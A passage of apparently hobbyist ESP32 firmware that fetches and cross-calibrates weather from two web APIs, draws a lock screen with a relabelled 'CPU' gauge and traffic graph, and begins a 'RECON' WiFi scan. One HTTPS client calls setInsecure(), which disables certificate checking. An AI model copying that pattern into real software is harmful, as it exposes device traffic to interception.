        case 356: strncpy(wd->cond, "RainShwr", sizeof(wd->cond)-1); break;
        case 359: strncpy(wd->cond, "HvyRainShwr", sizeof(wd->cond)-1); break;
        case 362: strncpy(wd->cond, "LtSleetShwr", sizeof(wd->cond)-1); break;
        case 365: strncpy(wd->cond, "SleetShwr", sizeof(wd->cond)-1); break;
        case 368: strncpy(wd->cond, "LtSnowShwr", sizeof(wd->cond)-1); break;
        case 371: strncpy(wd->cond, "SnowShwr", sizeof(wd->cond)-1); break;
        case 374: strncpy(wd->cond, "IceShwr", sizeof(wd->cond)-1); break;
        case 377: strncpy(wd->cond, "HvyIceShwr", sizeof(wd->cond)-1); break;
        case 386: strncpy(wd->cond, "ThndrRain", sizeof(wd->cond)-1); break;
        case 389: strncpy(wd->cond, "HvyThndr", sizeof(wd->cond)-1); break;
        case 392: strncpy(wd->cond, "ThndrSnow", sizeof(wd->cond)-1); break;
        case 395: strncpy(wd->cond, "HvyThndrSn", sizeof(wd->cond)-1); break;
        default:
            // Fallback: use the text description, truncated
            {
                const char* desc = cur["weatherDesc"][0]["value"];
                if (desc) {
                    strncpy(wd->cond, desc, sizeof(wd->cond) - 1);
                    wd->cond[sizeof(wd->cond) - 1] = '\0';
                } else {
                    wd->cond[0] = '\0';
                }
            }
            break;
    }
    wd->cond[sizeof(wd->cond) - 1] = '\0';

    // Humidity
    const char* humid = cur["humidity"];
    if (humid) {
        snprintf(wd->humid, sizeof(wd->humid), "%s%%", humid);
    } else {
        wd->humid[0] = '\0';
    }

    // Wind: speed + direction
    const char* windSpeed = cur["windspeedKmph"];
    const char* windDir = cur["winddir16Point"];
    if (windSpeed && windDir) {
        snprintf(wd->wind, sizeof(wd->wind), "%skm/h %s", windSpeed, windDir);
    } else if (windSpeed) {
        snprintf(wd->wind, sizeof(wd->wind), "%skm/h", windSpeed);
    } else {
        wd->wind[0] = '\0';
    }

    // Pressure
    const char* pressure = cur["pressure"];
    if (pressure) {
        strncpy(wd->pressure, pressure, sizeof(wd->pressure) - 1);
        wd->pressure[sizeof(wd->pressure) - 1] = '\0';
    } else {
        wd->pressure[0] = '\0';
    }

    // Visibility
    const char* visib = cur["visibility"];
    if (visib) {
        strncpy(wd->visib, visib, sizeof(wd->visib) - 1);
        wd->visib[sizeof(wd->visib) - 1] = '\0';
    } else {
        wd->visib[0] = '\0';
    }

    // Nearest area (location)
    JsonArray area_arr = doc["nearest_area"].as<JsonArray>();
    if (!area_arr.isNull() && area_arr.size() > 0) {
        const char* areaName = area_arr[0]["areaName"][0]["value"];
        if (areaName) {
            strncpy(wd->loc, areaName, sizeof(wd->loc) - 1);
            wd->loc[sizeof(wd->loc) - 1] = '\0';
        } else {
            wd->loc[0] = '\0';
        }
    } else {
        wd->loc[0] = '\0';
    }

    // Today's max/min temperature from weather[0]
    JsonArray weather_arr = doc["weather"].as<JsonArray>();
    if (!weather_arr.isNull() && weather_arr.size() > 0) {
        const char* maxC = weather_arr[0]["maxtempC"];
        const char* minC = weather_arr[0]["mintempC"];
        if (maxC && minC) {
            snprintf(wd->maxmin, sizeof(wd->maxmin), "%s~%sC", minC, maxC);
        } else {
            wd->maxmin[0] = '\0';
        }
    } else {
        wd->maxmin[0] = '\0';
    }

    return true;
}

// ═══════════════ OPEN-METEO WEATHER SOURCE ═══════════════
// Free, key-less API used as a cross-calibration source for wttr.in.
// Endpoint returns current conditions + today's max/min for Zengcheng (23.29, 113.83).
// Fills the same WeatherData fields as fetch_weather_wttr.
// Note: Open-Meteo visibility is in meters (converted to km here); wind_speed is km/h.
static bool fetch_weather_openmeteo(WeatherData* wd) {
    if (!wd) return false;

    WiFiClientSecure* ssl = new WiFiClientSecure();
    ssl->setInsecure();
    HTTPClient http;
    http.begin(*ssl, "https://api.open-meteo.com/v1/forecast?latitude=23.29&longitude=113.83&current=temperature_2m,relative_humidity_2m,apparent_temperature,weather_code,wind_speed_10m,wind_direction_10m,pressure_msl,visibility&daily=temperature_2m_max,temperature_2m_min&timezone=Asia/Shanghai&forecast_days=1");
    http.setTimeout(8000);

    int code = http.GET();
    if (code != 200) {
        Serial.printf("[WX-OM] HTTP error: %d\n", code);
        http.end();
        delete ssl;
        return false;
    }

    String body = http.getString();
    http.end();
    delete ssl;

    if (body.length() < 10 || body.length() > 8192) {
        Serial.printf("[WX-OM] Body length invalid: %d\n", body.length());
        return false;
    }

    // Parse JSON with DynamicJsonDocument on the heap (size 4096) to avoid stack overflow
    DynamicJsonDocument doc(4096);
    DeserializationError err = deserializeJson(doc, body);
    if (err) {
        Serial.printf("[WX-OM] JSON parse error: %s\n", err.c_str());
        return false;
    }

    JsonObject cur = doc["current"].as<JsonObject>();
    if (cur.isNull()) {
        Serial.println("[WX-OM] missing 'current'");
        return false;
    }

    // --- Temperature ---
    float temperature = cur["temperature_2m"] | 0.0f;
    snprintf(wd->temp, sizeof(wd->temp), "%.1fC", temperature);

    // --- Feels like ---
    float apparent = cur["apparent_temperature"] | 0.0f;
    snprintf(wd->feels, sizeof(wd->feels), "%.1fC", apparent);

    // --- Condition: WMO weather_code → concise English label ---
    int wc = cur["weather_code"] | 0;
    switch (wc) {
        case 0:  strncpy(wd->cond, "Sunny",       sizeof(wd->cond) - 1); break;  // 晴
        case 1:
        case 2:  strncpy(wd->cond, "PartCloudy",  sizeof(wd->cond) - 1); break;  // 多云
        case 3:  strncpy(wd->cond, "Overcast",    sizeof(wd->cond) - 1); break;  // 阴
        case 45:
        case 48: strncpy(wd->cond, "Fog",         sizeof(wd->cond) - 1); break;  // 雾
        case 51:
        case 53:
        case 55: strncpy(wd->cond, "LtRain",      sizeof(wd->cond) - 1); break;  // 毛毛雨/小雨
        case 56:
        case 57: strncpy(wd->cond, "FrzRain",     sizeof(wd->cond) - 1); break;  // 冻雨
        case 61:
        case 63: strncpy(wd->cond, "Rain",        sizeof(wd->cond) - 1); break;  // 雨
        case 65: strncpy(wd->cond, "HvyRain",     sizeof(wd->cond) - 1); break;  // 大雨
        case 66:
        case 67: strncpy(wd->cond, "FrzRain",     sizeof(wd->cond) - 1); break;  // 冻雨
        case 71:
        case 73: strncpy(wd->cond, "LtSnow",      sizeof(wd->cond) - 1); break;  // 小雪
        case 75: strncpy(wd->cond, "Snow",         sizeof(wd->cond) - 1); break;  // 雪
        case 77: strncpy(wd->cond, "Snow",         sizeof(wd->cond) - 1); break;  // 雪粒
        case 80:
        case 81: strncpy(wd->cond, "RainShwr",    sizeof(wd->cond) - 1); break;  // 阵雨
        case 82: strncpy(wd->cond, "HvyRainShwr", sizeof(wd->cond) - 1); break;  // 大阵雨
        case 85:
        case 86: strncpy(wd->cond, "SnowShwr",    sizeof(wd->cond) - 1); break;  // 阵雪
        case 95: strncpy(wd->cond, "Thunder",     sizeof(wd->cond) - 1); break;  // 雷电
        case 96:
        case 99: strncpy(wd->cond, "ThndrHail",   sizeof(wd->cond) - 1); break;  // 雷雹
        default: strncpy(wd->cond, "Unknown",      sizeof(wd->cond) - 1); break;
    }
    wd->cond[sizeof(wd->cond) - 1] = '\0';

    // --- Humidity ---
    int humidity = cur["relative_humidity_2m"] | 0;
    snprintf(wd->humid, sizeof(wd->humid), "%d%%", humidity);

    // --- Wind: speed (km/h) + 16-point compass direction ---
    float wind_speed = cur["wind_speed_10m"] | 0.0f;
    int wind_dir = cur["wind_direction_10m"] | 0;
    static const char* kCompass16[] = {
        "N", "NNE", "NE", "ENE", "E", "ESE", "SE", "SSE",
        "S", "SSW", "SW", "WSW", "W", "WNW", "NW", "NNW"
    };
    int dir_idx = (int)((wind_dir + 11.25f) / 22.5f) % 16;
    if (dir_idx < 0) dir_idx += 16;
    snprintf(wd->wind, sizeof(wd->wind), "%.1fkm/h %s", wind_speed, kCompass16[dir_idx]);

    // --- Pressure (MSL, hPa) ---
    float pressure_msl = cur["pressure_msl"] | 0.0f;
    snprintf(wd->pressure, sizeof(wd->pressure), "%.0f", pressure_msl);

    // --- Visibility (Open-Meteo gives meters → convert to km to match wttr.in) ---
    float vis_m = cur["visibility"] | 0.0f;
    snprintf(wd->visib, sizeof(wd->visib), "%.0f", vis_m / 1000.0f);

    // --- Location ---
    strncpy(wd->loc, "Zengcheng", sizeof(wd->loc) - 1);
    wd->loc[sizeof(wd->loc) - 1] = '\0';

    // --- Today's max/min temperature ---
    wd->maxmin[0] = '\0';
    JsonObject daily = doc["daily"].as<JsonObject>();
    if (!daily.isNull()) {
        JsonArray maxarr = daily["temperature_2m_max"].as<JsonArray>();
        JsonArray minarr = daily["temperature_2m_min"].as<JsonArray>();
        if (!maxarr.isNull() && maxarr.size() > 0 &&
            !minarr.isNull() && minarr.size() > 0) {
            float tmax = maxarr[0];
            float tmin = minarr[0];
            snprintf(wd->maxmin, sizeof(wd->maxmin), "%.0f~%.0fC", tmin, tmax);
        }
    }

    return true;
}

// ═══════════════ WEATHER CROSS-CALIBRATION (orchestrator) ═══════════════
// Tries wttr.in first, then Open-Meteo. If both succeed, averages temperature
// and feels-like readings for a more robust estimate. If only one succeeds,
// uses that source. Returns false only when both sources fail.
static bool fetch_weather_j1(WeatherData* wd) {
    if (!wd) return false;

    WeatherData wd_wttr;
    WeatherData wd_om;
    memset(&wd_wttr, 0, sizeof(wd_wttr));
    memset(&wd_om, 0, sizeof(wd_om));

    bool wttr_ok = fetch_weather_wttr(&wd_wttr);
    bool om_ok = fetch_weather_openmeteo(&wd_om);

    Serial.printf("[WX] wttr.in=%s  open-meteo=%s\n",
                  wttr_ok ? "ok" : "fail",
                  om_ok ? "ok" : "fail");

    if (wttr_ok && om_ok) {
        // Base the result on wttr.in, then cross-calibrate temp & feels-like.
        // (wd->* buffers are separate from wd_wttr.* / wd_om.* after the copy,
        //  so it is safe to read the originals while writing into wd->*.)
        *wd = wd_wttr;

        if (wd_wttr.temp[0] && wd_om.temp[0]) {
            float t1 = strtof(wd_wttr.temp, nullptr);
            float t2 = strtof(wd_om.temp, nullptr);
            snprintf(wd->temp, sizeof(wd->temp), "%.1fC", (t1 + t2) / 2.0f);
        }
        if (wd_wttr.feels[0] && wd_om.feels[0]) {
            float f1 = strtof(wd_wttr.feels, nullptr);
            float f2 = strtof(wd_om.feels, nullptr);
            snprintf(wd->feels, sizeof(wd->feels), "%.1fC", (f1 + f2) / 2.0f);
        }
        Serial.println("[WX] cross-calibrated wttr.in + Open-Meteo");
        return true;
    } else if (wttr_ok) {
        *wd = wd_wttr;
        Serial.println("[WX] using wttr.in only");
        return true;
    } else if (om_ok) {
        *wd = wd_om;
        Serial.println("[WX] using Open-Meteo only");
        return true;
    }

    Serial.println("[WX] both sources failed");
    return false;
}

// Try to fetch weather from wttr.in coordinates (23.29,113.83 = Zengcheng)
// Updates global weather cache (weather_temp, weather_cond, etc.)
static void lock_fetch_weather() {
    if (!g_wifi_conn || g_wifi_mode == WM_OFF) return;
    if (millis() - weather_last < 600000) return;  // 10 min throttle
    weather_last = millis();

    WeatherData wd;
    if (fetch_weather_j1(&wd)) {
        strncpy(weather_temp, wd.temp, 7);
        weather_temp[7] = '\0';
        strncpy(weather_cond, wd.cond, 15);
        weather_cond[15] = '\0';
        strncpy(weather_loc, wd.loc, 15);
        weather_loc[15] = '\0';
        snprintf(weather_buf, 32, "%s", weather_temp);
    } else {
        Serial.println("[WX] lock_fetch_weather failed");
    }
}

// ═══════════════ WEATHER FORECAST — detailed weather page ═══════════════
// Uses wttr.in coordinates (23.29,113.83 = Zengcheng, Guangzhou) to show all weather states
// Shows: temp, feels-like, condition, humidity, wind, pressure, visibility
static void weather_forecast() {
    Serial.println("[WX] Weather Forecast page");
    tft_soft_restore();

    // ── Helper: clean non-ASCII chars from a string ──
    auto clean_ascii = [](char* s) {
        for (int i = 0; s[i]; i++) {
            if ((uint8_t)s[i] > 127) s[i] = ' ';
        }
    };

    // ── Draw static UI ──
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("Weather FC");
    tft.setTextFont(1);

    WeatherData wd;
    bool fetch_ok = false;

    // ── Fetch function ──
    auto do_fetch = [&]() -> bool {
        if (g_wifi_mode == WM_OFF || !g_wifi_conn) return false;
        bool ok = fetch_weather_j1(&wd);
        if (ok) {
            // Update lock screen weather cache
            if (wd.temp[0]) {
                strncpy(weather_temp, wd.temp, 7); weather_temp[7] = '\0';
            }
            if (wd.cond[0]) {
                strncpy(weather_cond, wd.cond, 15); weather_cond[15] = '\0';
            }
            if (wd.loc[0]) {
                strncpy(weather_loc, wd.loc, 15); weather_loc[15] = '\0';
            }
            if (wd.temp[0]) {
                snprintf(weather_buf, 32, "%s", wd.temp);
            }
            weather_last = millis();
        }
        return ok;
    };

    // ── Draw weather data ──
    // cnfont chars are 16px tall; rows spaced 16px so 5 data rows + buttons fit
    // within the content area (CONTENT_Y+16 .. SCR_H). cnfont_print renders mixed
    // CN/ASCII automatically (CN 16px, ASCII 6x8).
    auto draw_weather = [&]() {
        tft.fillRect(0, CONTENT_Y + 12, SCR_W, CONTENT_H - 12, C_BLACK);
        int y = CONTENT_Y + 16;

        // Location (位置)
        {
            int x = 2;
            x += cnfont_print(x, y, "位置:", C_CYAN, C_BLACK);
            char loc_clip[16];
            scr_clip_text(loc_clip, wd.loc, 15);
            clean_ascii(loc_clip);
            cnfont_print(x + 1, y, loc_clip, C_WHITE, C_BLACK);
        }
        y += 16;

        // Temperature (温度) + feels-like (体感)
        {
            int x = 2;
            x += cnfont_print(x, y, "温度:", C_YELLOW, C_BLACK);
            x += cnfont_print(x, y, wd.temp, C_GREEN, C_BLACK);
            x += 3;
            x += cnfont_print(x, y, "体感:", C_DGRAY, C_BLACK);
            cnfont_print(x, y, wd.feels, C_WHITE, C_BLACK);
        }
        y += 16;

        // Condition (状况) + visibility (能见)
        {
            int x = 2;
            x += cnfont_print(x, y, "状况:", C_CYAN, C_BLACK);
            char cond_clip[16];
            scr_clip_text(cond_clip, wd.cond, 15);
            clean_ascii(cond_clip);
            x += cnfont_print(x, y, cond_clip, C_WHITE, C_BLACK);
            x += 3;
            x += cnfont_print(x, y, "能见:", C_CYAN, C_BLACK);
            cnfont_print(x, y, wd.visib, C_WHITE, C_BLACK);
        }
        y += 16;

        // Hi/Lo (高/低) + humidity (湿度)
        {
            int x = 2;
            x += cnfont_print(x, y, "高/低:", C_CYAN, C_BLACK);
            x += cnfont_print(x, y, wd.maxmin, C_ORANGE, C_BLACK);
            x += 3;
            x += cnfont_print(x, y, "湿度:", C_CYAN, C_BLACK);
            cnfont_print(x, y, wd.humid, C_WHITE, C_BLACK);
        }
        y += 16;

        // Wind (风力) + pressure (气压)
        {
            int x = 2;
            x += cnfont_print(x, y, "风力:", C_CYAN, C_BLACK);
            char wclip[10];
            scr_clip_text(wclip, wd.wind, 9);
            clean_ascii(wclip);
            x += cnfont_print(x, y, wclip, C_WHITE, C_BLACK);
            x += 3;
            x += cnfont_print(x, y, "气压:", C_CYAN, C_BLACK);
            cnfont_print(x, y, wd.pressure, C_WHITE, C_BLACK);
        }
        y += 16;

        // Separator
        tft.drawFastHLine(2, y, SCR_W - 4, C_DGRAY);
        y += 2;

        // Buttons
        cnfont_print(2, y, "A:刷新", C_GREEN, C_BLACK);
        cnfont_print(82, y, "B:返回", C_RED, C_BLACK);
    };

    // ── Show "Fetching..." ──
    // cnfont chars are 16px tall; rows spaced 18px to avoid overlap
    cnfont_print(4, CONTENT_Y + 24, "获取天气中...", C_CYAN, C_BLACK);
    cnfont_print(4, CONTENT_Y + 42, "增城 23.29,113.83", C_DGRAY, C_BLACK);

    // Animated dots
    for (int i = 0; i < 4; i++) {
        tft.fillRect(4, CONTENT_Y + 60, 40, 10, C_BLACK);
        tft.setTextColor(C_CYAN, C_BLACK);
        tft.setCursor(4, CONTENT_Y + 60);
        for (int d = 0; d <= i; d++) tft.print(".");
        delay(250);
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) {
            buzzer_click();
            return;
        }
    }

    // ── Initial fetch ──
    fetch_ok = do_fetch();

    if (!fetch_ok) {
        tft.fillRect(0, CONTENT_Y + 12, SCR_W, CONTENT_H - 12, C_BLACK);
        cnfont_print(4, CONTENT_Y + 20, "获取失败!", C_RED, C_BLACK);
        if (g_wifi_mode == WM_OFF) {
            cnfont_print(4, CONTENT_Y + 40, "WiFi已断开", C_DGRAY, C_BLACK);
            cnfont_print(4, CONTENT_Y + 58, "请先连接WiFi", C_DGRAY, C_BLACK);
        } else {
            cnfont_print(4, CONTENT_Y + 40, "连接服务器失败", C_DGRAY, C_BLACK);
            cnfont_print(4, CONTENT_Y + 58, "连接失败", C_DGRAY, C_BLACK);
        }
        cnfont_print(4, CONTENT_Y + 82, "B:返回", C_RED, C_BLACK);
        while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(30);
        buzzer_click();
        return;
    }

    // ── Draw weather data ──
    draw_weather();

    // ── Main loop: wait for button press ──
    while (true) {
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) {
            buzzer_click();
            return;
        }
        if (buttons_get_event(BTN_ID_A) == BTN_EVENT_PRESS) {
            buzzer_click();
            // Refresh
            tft.fillRect(0, CONTENT_Y + 12, SCR_W, CONTENT_H - 12, C_BLACK);
            cnfont_print(4, CONTENT_Y + 30, "刷新中...", C_CYAN, C_BLACK);

            for (int i = 0; i < 4; i++) {
                tft.fillRect(4, CONTENT_Y + 48, 30, 10, C_BLACK);
                tft.setTextColor(C_CYAN, C_BLACK);
                tft.setCursor(4, CONTENT_Y + 48);
                for (int d = 0; d <= i; d++) tft.print(".");
                delay(200);
            }

            fetch_ok = do_fetch();
            if (fetch_ok) {
                draw_weather();
            } else {
                tft.fillRect(0, CONTENT_Y + 12, SCR_W, CONTENT_H - 12, C_BLACK);
                cnfont_print(4, CONTENT_Y + 30, "刷新失败!", C_RED, C_BLACK);
                cnfont_print(4, CONTENT_Y + 48, "B:返回", C_DGRAY, C_BLACK);
            }
        }
        delay(30);
    }
}

// ═══════════════ NETWORK LATENCY (ping measurement) ═══════════════
static void measure_latency() {
    if (!g_wifi_conn || g_wifi_mode != WM_STA) {
        g_net_latency = 0;
        return;
    }
    if (millis() - g_last_wifi_check < 5000) return;  // 5 sec interval
    g_last_wifi_check = millis();
    
    // Use a quick TCP connect to measure RTT (no raw ICMP on ESP32)
    uint32_t t1 = millis();
    WiFiClient client;
    client.setTimeout(1000);
    if (client.connect("8.8.8.8", 53)) {
        g_net_latency = millis() - t1;
        client.stop();
    } else {
        g_net_latency = 999;  // unreachable
    }
}

// ═══════════════ WIFI AUTO-RECONNECT ═══════════════
static void wifi_auto_reconnect() {
    if (g_wifi_mode != WM_STA) return;
    
    // Check if WiFi is still connected
    if (WiFi.status() == WL_CONNECTED) {
        if (!g_wifi_conn) {
            Serial.println("[WIFI] Reconnected!");
            g_wifi_conn = true;
            g_wifi_was_connected = true;
        }
        return;
    }
    
    // WiFi disconnected
    if (g_wifi_conn) {
        Serial.println("[WIFI] Disconnected, will reconnect...");
        g_wifi_conn = false;
        g_wifi_disconnect_time = millis();
    }
    
    // Try to reconnect every 10 seconds
    if (g_wifi_disconnect_time > 0 && (millis() - g_wifi_disconnect_time > 10000)) {
        Serial.println("[WIFI] Attempting reconnect...");
        WiFi.reconnect();
        g_wifi_disconnect_time = millis();
        // Don't block — check connection status on next loop iteration.
        // The old delay(100) caused UI freezes during lock screen updates.
    }
}

static void lock_draw() {
    uint32_t ms = millis();
    int cx = SCR_W / 2;
    
    // ═══ Full redraw on first entry ═══
    if (lock_need) {
        lock_need = false;
        lock_time_last = 0;
        lock_time_buf[0] = '\0';
        lock_pkts_last = g_traffic_rx;
        lock_tx_last = g_traffic_tx;
        
        // ── Clean dark background + subtle dots ──
        scr_lock_wallpaper();
        
        // ── Header: "小喵系统" ──
        cnfont_print(4, CONTENT_Y + 1, "小喵系统", C_WHITE, C_BLACK);
        tft.drawFastHLine(0, CONTENT_Y + 18, SCR_W, C_DGRAY);
        
        // ── Central Shield Icon ──
        scr_draw_shield(cx, CONTENT_Y + 20);
        
        // ── Thin separator ──
        tft.drawFastHLine(16, CONTENT_Y + 34, SCR_W - 32, C_DGRAY);
        
        // ── SYS: CPU/MEM/WiFi/BAT ──
        int sy = CONTENT_Y + 38;
        uint32_t free_heap = ESP.getFreeHeap();
        uint32_t total_heap = ESP.getHeapSize();
        // MEM usage = (total - free) / total * 100
        int mem_pct = total_heap > 0 ? (int)((1.0f - (float)free_heap / total_heap) * 100) : 0;
        if (mem_pct > 100) mem_pct = 100;
        if (mem_pct < 0) mem_pct = 0;
        // CPU: use free heap ratio as a rough load indicator (lower heap = busier)
        // This is not a true CPU% but gives a useful activity indicator
        int cpu_pct = mem_pct; // simplified: same metric, relabeled
        
        // CPU label + real bar
        tft.setTextColor(C_CYAN, C_BLACK);
        tft.setCursor(4, sy); tft.print("CPU");
        tft.drawRect(28, sy, 60, 7, C_DGRAY);
        int cpu_w = (cpu_pct * 58) / 100;
        if (cpu_w > 0) {
            uint16_t cc = (cpu_pct < 40) ? C_CYAN : (cpu_pct < 70) ? C_YELLOW : C_RED;
            tft.fillRect(29, sy + 1, cpu_w, 5, cc);
        }
        tft.setCursor(92, sy);
        tft.setTextColor(C_WHITE, C_BLACK);
        tft.print(cpu_pct); tft.print("%");
        
        // MEM label + real bar
        tft.setTextColor(C_YELLOW, C_BLACK);
        tft.setCursor(4, sy + 10); tft.print("MEM");
        tft.drawRect(28, sy + 10, 60, 7, C_DGRAY);
        int mem_w = (mem_pct * 58) / 100;
        if (mem_w > 0) {
            uint16_t mc = (mem_pct < 50) ? C_CYAN : (mem_pct < 80) ? C_YELLOW : C_RED;
            tft.fillRect(29, sy + 11, mem_w, 5, mc);
        }
        tft.setCursor(92, sy + 10);
        tft.setTextColor(C_WHITE, C_BLACK);
        tft.print(mem_pct); tft.print("%");
        
        // WiFi status (replaces TEMP)
        tft.setTextColor(C_ORANGE, C_BLACK);
        tft.setCursor(4, sy + 20); tft.print("WiFi");
        tft.setTextColor(C_WHITE, C_BLACK);
        tft.setCursor(28, sy + 20);
        if (g_wifi_mode == WM_OFF) {
            tft.setTextColor(C_RED, C_BLACK);
            tft.print("OFF");
        } else if (g_wifi_mode == WM_STA) {
            tft.setTextColor(C_GREEN, C_BLACK);
            tft.print("STA");
        } else {
            tft.setTextColor(C_CYAN, C_BLACK);
            tft.print("AP");
        }
        // BAT (real analog read)
        tft.setTextColor(C_GREEN, C_BLACK);
        tft.setCursor(72, sy + 20); tft.print("BAT");
        tft.setTextColor(C_WHITE, C_BLACK);
        tft.setCursor(96, sy + 20);
        int bat_raw = analogRead(BAT_PIN);
        float bat_v = (bat_raw / 4095.0f) * 3.3f * 2.0f; // voltage divider 1:1
        tft.print(bat_v, 1); tft.print("V");
        
        // ── Thin separator ──
        tft.drawFastHLine(16, CONTENT_Y + 68, SCR_W - 32, C_DGRAY);
        
        // ── TRAFFIC GRAPH (cockpit-style mini dashboard) ──
        int ty = CONTENT_Y + 72;
        if (!lock_graph_inited) {
            lock_graph.init();
            lock_graph_inited = true;
        }
        
        tft.setTextColor(0x8410, 0x0300);  // muted blue-gray
        tft.setCursor(2, ty); tft.print("TX");
        tft.setTextColor(0xFFE0, 0x0300);  // yellow
        tft.setCursor(130, ty); tft.print("0B");
        // Graph area: x=18, y=ty, w=108, h=14
        lock_graph.draw(18, ty, 108, 14);
        
        // ── WEATHER + NTP (moved here, temp only with "C" suffix) ──
        // cnfont "天气" is 16px tall; row at CONTENT_Y+80 so the 16px text
        // doesn't overlap the bottom separator at CONTENT_Y+96.
        int wy = CONTENT_Y + 80;
        tft.drawFastHLine(2, wy - 2, SCR_W - 4, C_DGRAY);
        cnfont_print(2, wy, "天气", C_CYAN, C_BLACK);
        // Show temp + condition (ASCII only, no UTF-8)
        {
            char wclip[12];
            // Build "25C Clear" style string (no degree symbol)
            char wtmp[14];
            snprintf(wtmp, 14, "%s %s", weather_temp, weather_cond);
            scr_clip_text(wclip, wtmp, 11);
            // Clear any remaining non-ASCII chars
            for (int i = 0; wclip[i]; i++) {
                if ((uint8_t)wclip[i] > 127) wclip[i] = ' ';
            }
            cnfont_print(36, wy, wclip, C_WHITE, C_BLACK);
        }
        tft.setTextColor(C_MAGENTA, C_BLACK);
        tft.setCursor(112, wy); tft.print("NTP:");
        tft.setTextColor(C_WHITE, C_BLACK);
        tft.setCursor(130, wy);
        time_t now;
        time(&now);
        struct tm ti_struct;
        localtime_r(&now, &ti_struct);
        tft.print(ti_struct.tm_year + 1900 > 2020 ? "OK" : "..");
        
        // ── Bottom: UNLOCK hint + update notification ──
        tft.drawFastHLine(0, CONTENT_Y + 96, SCR_W, C_DGRAY);
        if (g_update_available) {
            String updMsg = "*更新 v" + String(g_update_new_ver) + "*";
            cnfont_print(2, CONTENT_Y + 98, updMsg.c_str(), C_YELLOW, C_BLACK);
        } else {
            cnfont_print_centered(CONTENT_Y + 98, "按键解锁", C_CYAN, C_BLACK);
        }
        
        lock_fetch_weather();
    }
    
    // ═══ Dynamic updates (every 1s) ═══
    if (ms - lock_time_last >= 1000) {
        lock_time_last = ms;
        
        // Periodically refresh weather (throttled internally to 10 min)
        lock_fetch_weather();
        
        // Measure network latency
        measure_latency();
        
        // Check WiFi auto-reconnect
        wifi_auto_reconnect();
        
        time_t now;
        time(&now);
        struct tm ti_struct2;
        localtime_r(&now, &ti_struct2);
        
        // ── Update CPU bar ──
        int sy = CONTENT_Y + 38;
        uint32_t free_heap = ESP.getFreeHeap();
        uint32_t total_heap = ESP.getHeapSize();
        int mem_pct = total_heap > 0 ? (int)((1.0f - (float)free_heap / total_heap) * 100) : 0;
        if (mem_pct > 100) mem_pct = 100;
        if (mem_pct < 0) mem_pct = 0;
        int cpu_pct = mem_pct; // same metric, relabeled as CPU activity indicator
        int cpu_w = (cpu_pct * 58) / 100;
        tft.fillRect(29, sy + 1, 58, 5, C_BLACK);
        if (cpu_w > 0) {
            uint16_t cc = (cpu_pct < 40) ? C_CYAN : (cpu_pct < 70) ? C_YELLOW : C_RED;
            tft.fillRect(29, sy + 1, cpu_w, 5, cc);
        }
        tft.fillRect(92, sy, 24, 8, C_BLACK);
        tft.setTextColor(C_WHITE, C_BLACK);
        tft.setCursor(92, sy);
        tft.print(cpu_pct); tft.print("%");
        
        // ── Update MEM bar ──
        if (mem_pct > 100) mem_pct = 100;
        int mem_w = (mem_pct * 58) / 100;
        tft.fillRect(29, sy + 11, 58, 5, C_BLACK);
        if (mem_w > 0) {
            uint16_t mc = (mem_pct < 50) ? C_CYAN : (mem_pct < 80) ? C_YELLOW : C_RED;
            tft.fillRect(29, sy + 11, mem_w, 5, mc);
        }
        tft.fillRect(92, sy + 10, 24, 8, C_BLACK);
        tft.setCursor(92, sy + 10);
        tft.print(mem_pct); tft.print("%");
        
        // ── Update WiFi status ──
        tft.fillRect(28, sy + 20, 40, 8, C_BLACK);
        tft.setCursor(28, sy + 20);
        if (g_wifi_mode == WM_OFF) {
            tft.setTextColor(C_RED, C_BLACK);
            tft.print("OFF");
        } else if (g_wifi_mode == WM_STA) {
            tft.setTextColor(C_GREEN, C_BLACK);
            tft.print("STA");
        } else {
            tft.setTextColor(C_CYAN, C_BLACK);
            tft.print("AP");
        }
        
        // ── Update BAT voltage ──
        tft.fillRect(96, sy + 20, 48, 8, C_BLACK);
        tft.setTextColor(C_WHITE, C_BLACK);
        tft.setCursor(96, sy + 20);
        int bat_raw = analogRead(BAT_PIN);
        float bat_v = (bat_raw / 4095.0f) * 3.3f * 2.0f;
        tft.print(bat_v, 1); tft.print("V");
        
        // ── Update TRAFFIC graph (push TX rate) ──
        int ty = CONTENT_Y + 72;
        uint32_t tx_rate = g_traffic_tx - lock_tx_last;
        if (tx_rate > 1000000) tx_rate = 1000000;
        lock_graph.push(tx_rate);
        lock_graph.draw(18, ty, 108, 14);
        
        // Update TX bytes display
        tft.fillRect(130, ty, 28, 8, 0x0300);
        tft.setTextColor(0xFFE0, 0x0300);
        tft.setCursor(130, ty);
        if (tx_rate >= 1024) { tft.print(tx_rate / 1024); tft.print("K"); }
        else { tft.print(tx_rate); tft.print("B"); }
        
        // ── Update weather (temp only, ASCII) ──
        int wy = CONTENT_Y + 80;
        {
            char wclip[12];
            char wtmp[14];
            snprintf(wtmp, 14, "%s %s", weather_temp, weather_cond);
            scr_clip_text(wclip, wtmp, 11);
            for (int i = 0; wclip[i]; i++) {
                if ((uint8_t)wclip[i] > 127) wclip[i] = ' ';
            }
            // Clear weather data area (after "天气" label) and redraw
            tft.fillRect(36, wy, 74, 16, C_BLACK);
            cnfont_print(36, wy, wclip, C_WHITE, C_BLACK);
        }
        
        // ── Update NTP status ──
        tft.fillRect(130, wy, 28, 8, C_BLACK);
        tft.setTextColor(C_WHITE, C_BLACK);
        tft.setCursor(130, wy);
        tft.print(ti_struct2.tm_year + 1900 > 2020 ? "OK" : "..");
        
        lock_pkts_last = g_traffic_rx;
        lock_tx_last = g_traffic_tx;
    }
}

// ═══════════════ RECON: WiFi Scan ═══════════════
static void recon_wifi() {
    // ── Always restore screen first to prevent black screen ──
    tft_soft_restore();

    if (g_wifi_mode == WM_OFF) {
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        g_wifi_mode = WM_STA;
        delay(100);  // Let radio initialize before scanning
        tft_soft_restore();  // Restore again after WiFi mode switch
    }
    
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("WiFi扫描");
    tft.setTextFont(1);
    cnfont_print(4, CONTENT_Y + 16, "扫描中...", C_CYAN, C_BLACK);
    cnfont_print(4, CONTENT_Y + 32, "全信道...", C_DGRAY, C_BLACK);
    
    yield();  // Feed watchdog before blocking scan
    
    // Scan ALL channels (channel=0), 300ms per channel, sync mode
